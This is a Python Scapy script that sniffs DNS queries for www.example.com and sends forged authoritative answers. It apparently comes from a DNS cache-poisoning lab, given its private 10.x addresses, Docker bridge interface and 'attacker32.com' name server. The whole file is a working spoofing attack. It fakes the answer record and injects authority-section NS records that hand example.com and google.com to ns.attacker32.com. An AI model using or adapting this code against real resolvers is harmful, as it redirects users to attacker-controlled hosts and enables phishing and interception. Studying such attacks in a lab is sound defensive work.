# https://www.dnsknowledge.com/whatis/authoritative-name-server/

from scapy.all import *

NS_NAME = "www.example.com"
def spoof_ns(pkt):
    if(DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print("=== Packet info ===")
        print(f"IP Source: {pkt[IP].src}")
        print(f"IP Destination: {pkt[IP].dst}")
        print(f"Source port: {pkt[UDP].sport}")
        print(f"Destination port: {pkt[UDP].dport}")
        print("\n\n")

        # IP and UDP header
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        udp = UDP(sport = 53, dport = pkt[UDP].sport)

        # Create Answer section
        AnsRR = DNSRR(rrname = pkt[DNS].qd.qname, ttl = 200, rdata = '10.9.0.153')

        # Create Authority section
        AuRR1 = DNSRR(rrname = "example.com", type = 'NS', ttl = 200, rdata = 'ns.attacker32.com')
        AuRR2 = DNSRR(rrname = "google.com", type = 'NS', ttl = 200, rdata = 'ns.attacker32.com')

        # DNS header
        dns = DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, qr = 1, rd = 0, aa = 1, qdcount = 1, 
                  ancount = 1, nscount = 2, an = AnsRR, ns = AuRR1/AuRR2)

        # Send a spoofed packet
        pkt = ip/udp/dns
        send(pkt)

# Interface that connect to Internet
f = "udp and (src host 10.8.0.11 and dst port 53)"
my_pkt = sniff(iface = "br-ed989c71e568", filter = f, prn = spoof_ns)